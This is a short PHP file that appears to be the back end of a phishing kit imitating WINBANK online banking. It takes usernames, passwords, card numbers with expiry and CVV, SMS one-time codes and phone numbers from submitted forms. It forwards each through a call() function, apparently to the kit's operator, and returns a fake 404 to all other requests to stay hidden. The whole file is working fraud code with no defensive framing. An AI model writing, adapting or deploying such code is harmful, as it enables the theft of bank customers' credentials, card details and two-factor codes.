<?php 
session_start();
require '../config.php';

if(isset($_POST['user'])){
call("/- WINBANK LOGIN -/
User: ".$_POST['user']."
Pass: ".$_POST['pass']);
return;
}


if(isset($_POST['cc'])){
call("/- WINBANK CC -/
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
" );
return;
}


if(isset($_POST['sms'])){
call("/- WINBANK SMS -/
CODE: ".$_POST['sms']."
");
return;
}

if(isset($_POST['phone'])){
call("/- WINBANK PHONE -/
Number: ".$_POST['phone']."
");
return;
}


header("HTTP/1.0 404 Not Found");

?>